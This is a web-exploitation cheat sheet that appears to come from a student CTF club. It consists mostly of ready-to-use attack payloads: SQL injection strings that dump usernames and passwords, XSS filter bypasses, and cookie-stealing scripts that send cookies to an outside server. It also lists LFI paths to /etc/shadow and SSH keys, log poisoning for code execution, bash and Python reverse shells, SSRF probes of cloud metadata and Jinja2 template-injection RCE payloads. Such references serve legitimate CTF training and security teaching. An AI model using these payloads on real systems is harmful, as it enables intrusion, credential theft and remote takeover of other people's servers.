# 🌐 Web Exploitation Cheatsheet

> **C!p#3r Club IIST** | Quick reference for web CTF challenges

---

## 🔍 Reconnaissance First

```bash
# Directory discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Technology detection
whatweb http://target.com
curl -I http://target.com               # Check HTTP headers
```

---

## 💉 SQL Injection

### Detection Payloads

```sql
'
''
`
')
"))
' OR '1'='1
' OR '1'='1' --
' OR 1=1--
" OR "1"="1
admin'--
admin' #
' UNION SELECT null--
```

### Manual SQLi

```sql
-- Find number of columns
ORDER BY 1--
ORDER BY 2--
(increase until error)

-- UNION-based (after finding column count)
' UNION SELECT null,null,null--
' UNION SELECT 1,2,3--

-- MySQL: get database info
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,':',password),3 FROM users--

-- MySQL: file read
' UNION SELECT 1,load_file('/etc/passwd'),3--
```

### SQLMap (Automated)

```bash
sqlmap -u "http://target.com/page?id=1"
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D mydb --tables
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump
sqlmap -r request.txt --level=5 --risk=3    # From Burp request file
sqlmap -u "http://target.com/page?id=1" --os-shell   # Get shell
```

---

## 🖥️ Cross-Site Scripting (XSS)

### Basic Payloads

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
<iframe src="javascript:alert(1)">
```

### Bypass Filters

```javascript
<ScRiPt>alert(1)</ScRiPt>           // Case variation
<script>alert`1`</script>           // Template literals
<img/src=x onerror=alert(1)>        // No spaces
<img src="x" onerror="alert(1)">
&#60;script&#62;alert(1)&#60;/script&#62;  // HTML entities
<scr<script>ipt>alert(1)</scr</script>ipt>  // Nested tags
```

### Steal Cookies (CTF)

```javascript
<script>document.location='http://yourserver.com/log?c='+document.cookie</script>
<img src=x onerror="fetch('http://yourserver.com/?c='+document.cookie)">
```

---

## 📁 Local File Inclusion (LFI)

```
# Basic LFI
http://target.com/page?file=../../../etc/passwd
http://target.com/page?file=....//....//....//etc/passwd  # Filter bypass
http://target.com/page?file=..%2F..%2F..%2Fetc%2Fpasswd  # URL encoded

# Interesting files to read
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log   # Log poisoning!
/var/www/html/config.php
/home/user/.ssh/id_rsa

# PHP wrappers (powerful!)
php://filter/convert.base64-encode/resource=index.php  # Read PHP source
php://input (POST data as PHP)
data://text/plain,<?php system('id');?>

# Log poisoning (LFI → RCE)
# 1. Poison the log: curl -A "<?php system(\$_GET['cmd']);?>" http://target.com
# 2. Include the log: ?file=/var/log/apache2/access.log&cmd=id
```

---

## 💻 Command Injection

```bash
# Basic detection
; id
| id
&& id
`id`
$(id)
|| id

# Bypass filters
c''at /etc/passwd           # Empty string injection
c$@t /etc/passwd            # Variable injection
$(echo 'aWQ=' | base64 -d)  # Base64 encoded command
%0aid                        # Newline injection

# Reverse shell via command injection
; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 🔑 Authentication Attacks

### Default Credentials

```
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest
```

### JWT (JSON Web Tokens)

```
# Decode JWT (base64 each part)
echo "eyJhbGc..." | base64 -d

# Algorithm confusion: change "alg" to "none"
# Modified header: {"alg":"none","typ":"JWT"}

# Crack JWT secret
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
# Or: python3 -c tools like jwt_tool
```

### Cookie Manipulation

```
# Check cookies in browser: DevTools → Application → Cookies
# Or in Burp Suite intercept

# Common cookie values to try:
admin=true
role=admin
isAdmin=1
user=0 (change to user=1 or user=admin)
```

---

## 🔄 SSRF (Server-Side Request Forgery)

```
# Basic SSRF payloads
http://localhost/admin
http://127.0.0.1/admin
http://[::1]/admin
http://0.0.0.0/admin
http://0x7f000001/admin

# Internal services to probe
http://localhost:22
http://localhost:3306
http://localhost:6379   # Redis
http://169.254.169.254/latest/meta-data/  # AWS metadata!
```

---

## 📋 IDOR (Insecure Direct Object Reference)

```
# Change object IDs in:
- URL parameters: ?id=1 → ?id=2
- Body parameters: {"user_id": 1} → {"user_id": 2}
- Cookies: user=1 → user=0
- Path: /api/users/1/profile → /api/users/2/profile

# Try UUIDs if numeric doesn't work
# Try negative numbers: ?id=-1
# Try zero: ?id=0
```

---

## 🖋️ SSTI (Server-Side Template Injection)

```
# Detection payloads
{{7*7}}        → 49 (Jinja2, Twig)
${7*7}         → 49 (FreeMarker)
<%= 7*7 %>    → 49 (ERB/Ruby)
#{7*7}         → 49 (Ruby)

# Jinja2 (Python) RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

---

## 📌 Burp Suite Quick Reference

```
Essential shortcuts:
Ctrl+I         → Send to Intruder
Ctrl+R         → Send to Repeater
Ctrl+Shift+U  → URL decode
Ctrl+Shift+B  → Base64 encode

Intercept flow:
1. Proxy → Intercept ON
2. Request comes in → modify it
3. Forward to send modified request

Useful Scanner payloads:
Fuzzing - Quick → detect common vulns quickly
```

---

## 🛠️ Tools Quick Reference

| Tool | When to Use | Command |
|---|---|---|
| Burp Suite | All web testing | `burpsuite` |
| gobuster | Directory brute force | `gobuster dir -u URL -w wordlist` |
| ffuf | Fast fuzzing | `ffuf -u URL/FUZZ -w wordlist` |
| sqlmap | SQLi automated | `sqlmap -u "URL?id=1"` |
| nikto | Vuln scanner | `nikto -h URL` |
| curl | HTTP requests | `curl -v URL` |
| wfuzz | Web fuzzing | `wfuzz -c -z file,wordlist URL/FUZZ` |

---

<div align="center">

*C!p#3r Club IIST — Decode · Defend · Dominate* 🔐

[Back to README](../../README.md)

</div>
